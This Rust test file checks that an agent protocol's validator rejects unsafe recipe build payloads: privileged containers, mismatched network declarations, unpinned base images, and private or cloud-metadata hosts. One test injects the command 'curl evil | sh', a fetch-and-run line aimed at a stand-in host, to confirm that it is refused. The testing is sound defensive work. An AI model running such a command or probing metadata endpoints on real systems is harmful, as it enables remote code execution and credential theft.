use chrono::DateTime;
use serde::Deserialize;
use serde_json::json;
use uuid::Uuid;
use vonk_agent_protocol::{AgentClaim, RecipeOperationRequest, canonical_json, hex_sha256};

fn claim(operation: &str, payload: serde_json::Value) -> AgentClaim {
    AgentClaim {
        attempt: 1,
        authority_revision: "c".repeat(64),
        deadline: DateTime::parse_from_rfc3339("2026-08-07T12:05:00+00:00").unwrap(),
        fence: Uuid::parse_str("00000000-0000-4000-8000-000000000003").unwrap(),
        job_id: Uuid::parse_str("00000000-0000-4000-8000-000000000004").unwrap(),
        node_id: format!("spk_{}", "0".repeat(32)),
        operation: operation.to_owned(),
        operation_id: Uuid::parse_str("00000000-0000-4000-8000-000000000005").unwrap(),
        payload_digest: hex_sha256(&canonical_json(&payload).unwrap()),
        payload,
        schema_version: 1,
    }
}

fn build_payload() -> serde_json::Value {
    json!({
        "schema_version": 1,
        "kind": "recipe.build.v1",
        "build_id": "00000000-0000-4000-8000-000000000009",
        "recipe_revision_id": "00000000-0000-4000-8000-000000000001",
        "recipe_content_sha256": "a".repeat(64),
        "source_bundle_sha256": "b".repeat(64),
        "source_bundle_bytes": 4096,
        "build_input_sha256": "c".repeat(64),
        "base_images": [{
            "reference": format!("ghcr.io/vonkforge/base@sha256:{}", "d".repeat(64)),
            "manifest_digest": format!("sha256:{}", "d".repeat(64))
        }],
        "base_image_storage_bytes": 68719476736_u64,
        "dockerfile": "Dockerfile",
        "platform": "linux/arm64",
        "arguments": [{"name": "runtime-version", "value": "1"}],
        "network": {"mode": "none", "hosts": []},
        "limits": {
            "cpu_cores": 8,
            "memory_bytes": 8589934592_u64,
            "temporary_bytes": 68719476736_u64,
            "processes": 4096,
            "timeout_seconds": 3600,
            "output_bytes": 67108864,
            "gpu": 0,
            "privileged": false,
            "host_mounts": false,
            "container_socket": false
        }
    })
}

#[derive(Deserialize)]
struct SharedVectors {
    schema_version: u8,
    base_payload: serde_json::Value,
    cases: Vec<SharedVectorCase>,
}

#[derive(Deserialize)]
struct SharedVectorCase {
    name: String,
    valid: bool,
    changes: Vec<SharedVectorChange>,
}

#[derive(Deserialize)]
struct SharedVectorChange {
    op: String,
    path: Vec<serde_json::Value>,
    value: Option<serde_json::Value>,
}

fn apply_change(payload: &mut serde_json::Value, change: &SharedVectorChange) {
    let (last, parents) = change.path.split_last().expect("non-empty vector path");
    let mut target = payload;
    for component in parents {
        target = match component {
            serde_json::Value::String(key) => target
                .as_object_mut()
                .and_then(|value| value.get_mut(key))
                .expect("object vector path"),
            serde_json::Value::Number(index) => target
                .as_array_mut()
                .and_then(|value| value.get_mut(index.as_u64().expect("array index") as usize))
                .expect("array vector path"),
            _ => panic!("invalid vector path component"),
        };
    }
    match (change.op.as_str(), last) {
        ("set", serde_json::Value::String(key)) => {
            target
                .as_object_mut()
                .expect("object vector target")
                .insert(key.clone(), change.value.clone().expect("set value"));
        }
        ("set", serde_json::Value::Number(index)) => {
            target.as_array_mut().expect("array vector target")
                [index.as_u64().expect("array index") as usize] =
                change.value.clone().expect("set value");
        }
        ("remove", serde_json::Value::String(key)) => {
            target
                .as_object_mut()
                .expect("object vector target")
                .remove(key)
                .expect("removed vector field");
        }
        _ => panic!("invalid shared vector change"),
    }
}

#[test]
fn build_claim_matches_shared_python_rust_vectors() {
    let vectors: SharedVectors = serde_json::from_str(include_str!(
        "../../../../agent_protocol/src/vonk_agent_protocol/vectors/recipe-build-claim-v1.json"
    ))
    .unwrap();
    assert_eq!(vectors.schema_version, 1);

    for case in vectors.cases {
        let mut payload = vectors.base_payload.clone();
        for change in &case.changes {
            apply_change(&mut payload, change);
        }
        assert_eq!(
            RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_ok(),
            case.valid,
            "shared vector disagreed: {}",
            case.name
        );
    }
}

#[test]
fn build_payload_is_closed_and_declarative() {
    assert!(matches!(
        RecipeOperationRequest::parse(&claim("recipe.build.v1", build_payload())).unwrap(),
        RecipeOperationRequest::Build(_)
    ));

    let mut unsafe_payload = build_payload();
    unsafe_payload["limits"]["privileged"] = json!(true);
    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", unsafe_payload)).is_err());

    let mut command = build_payload();
    command["command"] = json!("curl evil | sh");
    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", command)).is_err());
}

#[test]
fn build_network_requires_a_consistent_mode_and_host_declaration() {
    let mut payload = build_payload();
    payload["network"] = json!({"mode": "none", "hosts": ["pypi.org"]});
    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err());

    let mut payload = build_payload();
    payload["network"] = json!({"mode": "public", "hosts": []});
    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err());
}

#[test]
fn build_base_images_are_exact_declared_supply_chain_authority() {
    let mut payload = build_payload();
    payload["base_images"][0]["manifest_digest"] = json!(format!("sha256:{}", "e".repeat(64)));
    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err());

    let mut payload = build_payload();
    payload["base_images"][0]["reference"] = json!("ghcr.io/vonkforge/base:latest");
    assert!(RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err());
}

#[test]
fn build_network_rejects_private_and_metadata_destinations() {
    for host in [
        "127.0.0.1",
        "10.0.0.1",
        "169.254.169.254",
        "localhost",
        "metadata.google.internal",
    ] {
        let mut payload = build_payload();
        payload["network"] = json!({"mode": "public", "hosts": [host]});
        assert!(
            RecipeOperationRequest::parse(&claim("recipe.build.v1", payload)).is_err(),
            "private or metadata host was accepted: {host}"
        );
    }
}

#[test]
fn image_import_binds_one_exact_build_and_layout() {
    let payload = json!({
        "schema_version": 1,
        "kind": "recipe.image.import.v1",
        "build_id": "00000000-0000-4000-8000-000000000001",
        "mapping_id": "00000000-0000-4000-8000-000000000002",
        "mapping_generation": 1,
        "source_node_id": format!("spk_{}", "1".repeat(32)),
        "image_digest": format!("sha256:{}", "d".repeat(64)),
        "oci_layout_sha256": "e".repeat(64),
        "image_bytes": 1024
    });
    assert!(matches!(
        RecipeOperationRequest::parse(&claim("recipe.image.import.v1", payload)).unwrap(),
        RecipeOperationRequest::ImageImport(_)
    ));
}
